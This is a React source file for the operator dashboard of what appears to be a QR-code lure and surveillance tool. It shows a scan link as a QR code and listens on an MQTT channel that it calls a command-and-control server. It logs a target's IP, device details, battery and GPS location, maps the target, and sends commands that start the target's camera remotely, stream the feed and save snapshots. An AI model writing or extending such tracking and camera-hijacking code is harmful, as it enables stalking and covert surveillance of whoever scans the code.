
import React, { useEffect, useState, useCallback, useRef } from 'react';
import { v4 as uuidv4 } from 'uuid';
import Terminal from '../components/Terminal';
import QRCodeDisplay from '../components/QRCodeDisplay';
import HackerMap from '../components/HackerMap';
import { mqttService } from '../services/mqttService';
import { TerminalLog, DeviceInfo, StreamMessage } from '../types';
import { Camera, X, Disc, Video, Aperture } from 'lucide-react';

const Dashboard: React.FC = () => {
  const [sessionId] = useState(uuidv4());
  const [logs, setLogs] = useState<TerminalLog[]>([]);
  const [connected, setConnected] = useState(false);
  const [targetUrl, setTargetUrl] = useState('');
  const [targetCoords, setTargetCoords] = useState<{lat: number, lng: number} | null>(null);
  
  // Camera Surveillance State
  const [showCameraModal, setShowCameraModal] = useState(false);
  const [cameraStream, setCameraStream] = useState<string | null>(null);
  const [isCameraActive, setIsCameraActive] = useState(false);
  
  // Audio context for sound effects
  const audioCtxRef = useRef<AudioContext | null>(null);

  const playSound = useCallback((type: 'connect' | 'data' | 'boot' | 'alert') => {
    if (!audioCtxRef.current) {
      audioCtxRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
    }
    const ctx = audioCtxRef.current;
    if (!ctx) return;

    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    
    osc.connect(gain);
    gain.connect(ctx.destination);

    const now = ctx.currentTime;

    if (type === 'boot') {
      osc.type = 'square';
      osc.frequency.setValueAtTime(100, now);
      osc.frequency.exponentialRampToValueAtTime(800, now + 0.1);
      gain.gain.setValueAtTime(0.1, now);
      gain.gain.exponentialRampToValueAtTime(0.01, now + 0.3);
      osc.start(now);
      osc.stop(now + 0.3);
    } else if (type === 'connect') {
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(440, now);
      osc.frequency.setValueAtTime(880, now + 0.1);
      gain.gain.setValueAtTime(0.1, now);
      gain.gain.linearRampToValueAtTime(0, now + 0.5);
      osc.start(now);
      osc.stop(now + 0.5);
    } else if (type === 'data') {
      osc.type = 'sine';
      osc.frequency.setValueAtTime(1200, now);
      osc.frequency.exponentialRampToValueAtTime(600, now + 0.1);
      gain.gain.setValueAtTime(0.05, now);
      gain.gain.linearRampToValueAtTime(0, now + 0.1);
      osc.start(now);
      osc.stop(now + 0.1);
    } else if (type === 'alert') {
      osc.type = 'square';
      osc.frequency.setValueAtTime(200, now);
      osc.frequency.linearRampToValueAtTime(100, now + 0.2);
      gain.gain.setValueAtTime(0.1, now);
      gain.gain.linearRampToValueAtTime(0, now + 0.2);
      osc.start(now);
      osc.stop(now + 0.2);
    }
  }, []);

  const addLog = useCallback((message: string, type: TerminalLog['type'] = 'info', link?: string) => {
    setLogs(prev => [...prev, {
      id: uuidv4(),
      message,
      type,
      timestamp: new Date().toISOString(),
      link
    }]);
    
    if (type === 'success' || type === 'warning') {
        playSound('data');
    }
  }, [playSound]);

  const toggleCamera = () => {
    if (!connected) {
      addLog('ERROR: NO TARGET CONNECTED', 'error');
      return;
    }
    
    if (!isCameraActive) {
      addLog('INITIATING_REMOTE_SURVEILLANCE_PROTOCOL...', 'warning');
      mqttService.publishCommand(sessionId, { type: 'ACTIVATE_CAMERA', timestamp: new Date().toISOString() });
      setShowCameraModal(true);
      setIsCameraActive(true);
    } else {
      addLog('TERMINATING_SURVEILLANCE_FEED', 'system');
      mqttService.publishCommand(sessionId, { type: 'STOP_CAMERA', timestamp: new Date().toISOString() });
      setShowCameraModal(false);
      setIsCameraActive(false);
      setCameraStream(null);
    }
  };

  const takeSnapshot = () => {
     if (!cameraStream) return;
     const link = document.createElement('a');
     link.href = cameraStream;
     link.download = `pegasus_capture_${sessionId.substring(0,8)}_${Date.now()}.jpg`;
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
     addLog('SNAPSHOT_SAVED_TO_EVIDENCE_LOG', 'success');
     playSound('alert');
  };

  useEffect(() => {
    const baseUrl = window.location.href.split('#')[0];
    const scanUrl = `${baseUrl}#/scan?session=${sessionId}`;
    setTargetUrl(scanUrl);

    playSound('boot');

    addLog(`SYSTEM_BOOT_SEQUENCE_INITIATED`, 'system');
    addLog(`SESSION_ID: ${sessionId}`, 'system');
    addLog(`LISTENING_PORT: 443 [WSS]`, 'info');
    addLog(`GENERATING_PAYLOAD_VECTOR...`, 'info');

    mqttService.connect(
      sessionId,
      (payload: DeviceInfo) => {
        // Handle incoming telemetry
        playSound('connect');
        addLog(`!!! INTRUSION ALERT !!!`, 'warning');
        addLog(`CONNECTION ESTABLISHED FROM ${payload.ip}`, 'success');
        addLog(`DECRYPTING_PACKET_HEADER...`, 'system');
        
        setTimeout(() => {
          addLog(`TARGET_IP: ${payload.ip}`, 'warning');
          addLog(`PLATFORM: ${payload.platform}`, 'info');
          addLog(`VENDOR: ${payload.vendor}`, 'info');
          addLog(`RESOLUTION: ${payload.screenWidth}x${payload.screenHeight}`, 'info');
          
          if (payload.battery) addLog(`POWER_LEVEL: ${payload.battery}%`, 'info');
          if (payload.gpu) addLog(`GPU_RENDERER: ${payload.gpu}`, 'info');

          if (payload.coords) {
             addLog(`GPS_TRIANGULATION: SUCCESS`, 'success');
             addLog(`LAT: ${payload.coords.latitude}`, 'warning');
             addLog(`LON: ${payload.coords.longitude}`, 'warning');
             const mapsUrl = `https://www.google.com/maps?q=${payload.coords.latitude},${payload.coords.longitude}`;
             addLog(`GENERATING_MAP_REFERENCE...`, 'system', mapsUrl);
             setTargetCoords({
               lat: payload.coords.latitude,
               lng: payload.coords.longitude
             });
          } else {
             addLog(`GPS_SIGNAL: NOT_DETECTED/DENIED`, 'error');
          }
          
          addLog(`DATA_EXTRACTION_COMPLETE.`, 'success');
          addLog(`-----------------------------------`, 'system');
        }, 800);
      },
      () => {
        setConnected(true);
        addLog(`C2_SERVER_ONLINE. Waiting for target...`, 'success');
      },
      // No inbound commands for dashboard
      undefined, 
      // Stream handler
      (streamData: StreamMessage) => {
        setCameraStream(streamData.image);
      }
    );

    return () => {
      mqttService.disconnect();
    };
  }, [sessionId, addLog, playSound]);

  return (
    <div 
      className="flex flex-col md:flex-row h-screen w-screen overflow-hidden"
      onClick={() => {
        if (audioCtxRef.current?.state === 'suspended') {
          audioCtxRef.current.resume();
        }
      }}
    >
      {/* Left Side: Terminal */}
      <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-20 flex flex-col">
        <div className="flex-1 overflow-hidden">
           <Terminal logs={logs} connected={connected} sessionId={sessionId} />
        </div>
        
        {/* Terminal Controls */}
        <div className="bg-gray-900 border-t border-gray-800 p-2 flex justify-end gap-2">
           <button 
             onClick={toggleCamera}
             disabled={!connected}
             className={`flex items-center gap-2 px-4 py-2 text-xs font-mono font-bold uppercase tracking-wider border transition-all ${
               isCameraActive 
               ? 'bg-red-900/50 border-red-500 text-red-500 animate-pulse' 
               : connected 
                 ? 'bg-gray-800 border-gray-600 text-gray-300 hover:border-green-500 hover:text-green-500 hover:bg-green-900/20' 
                 : 'bg-black border-gray-800 text-gray-700 cursor-not-allowed'
             }`}
           >
             <Camera size={14} />
             {isCameraActive ? 'STOP_SURVEILLANCE' : 'ACTIVATE_CAM_FEED'}
           </button>
        </div>
      </div>

      {/* Right Side: QR Code OR Hacker Map */}
      <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-10 border-l border-gray-800">
        {targetCoords ? (
          <HackerMap lat={targetCoords.lat} lng={targetCoords.lng} />
        ) : (
          <QRCodeDisplay url={targetUrl} />
        )}
      </div>

      {/* Surveillance Modal */}
      {showCameraModal && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-black border border-red-900 w-full max-w-2xl shadow-[0_0_50px_rgba(255,0,0,0.2)] flex flex-col">
            <div className="bg-red-900/20 border-b border-red-900/50 p-2 flex justify-between items-center text-red-500 font-mono text-xs uppercase tracking-wider">
              <div className="flex items-center gap-2">
                 <Disc size={12} className="animate-pulse text-red-600" />
                 <span>LIVE_FEED :: {sessionId.substring(0,8)}</span>
              </div>
              <div className="flex items-center gap-2">
                <button 
                   onClick={takeSnapshot} 
                   className="hover:text-white hover:bg-red-900/50 p-1 rounded transition-colors"
                   title="Take Snapshot"
                >
                   <Aperture size={16} />
                </button>
                <div className="w-[1px] h-4 bg-red-900/50 mx-1"></div>
                <button onClick={toggleCamera} className="hover:text-white"><X size={16} /></button>
              </div>
            </div>
            
            <div className="relative aspect-video bg-black flex items-center justify-center overflow-hidden group">
              {/* Scanlines Overlay - subtle, no filters on image itself */}
              <div className="absolute inset-0 z-20 pointer-events-none bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.1)_50%)] bg-[length:100%_2px]"></div>
              
              {cameraStream ? (
                // REMOVED filters for maximum clarity as requested
                <img src={cameraStream} className="w-full h-full object-cover" alt="Surveillance Feed" />
              ) : (
                <div className="text-red-500 font-mono text-xs animate-pulse flex flex-col items-center gap-2">
                  <Video size={32} />
                  <span>ESTABLISHING_VIDEO_UPLINK...</span>
                  <span className="text-[10px] text-gray-500">WAITING FOR USER AUTHORIZATION</span>
                </div>
              )}

              {/* HUD Elements */}
              <div className="absolute top-4 right-4 z-30 flex items-center gap-2 text-red-500 text-xs font-mono font-bold">
                 <div className="w-2 h-2 rounded-full bg-red-500 animate-ping"></div>
                 REC
              </div>
              <div className="absolute bottom-4 left-4 z-30 text-green-500 text-[10px] font-mono opacity-80 bg-black/50 px-2 py-1">
                 CAM_01 // RAW_FEED // 480p
              </div>
               {/* Crosshair */}
               <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-12 h-12 border border-red-500/30 z-20 pointer-events-none">
                  <div className="absolute top-1/2 left-0 w-full h-[1px] bg-red-500/30"></div>
                  <div className="absolute top-0 left-1/2 h-full w-[1px] bg-red-500/30"></div>
               </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
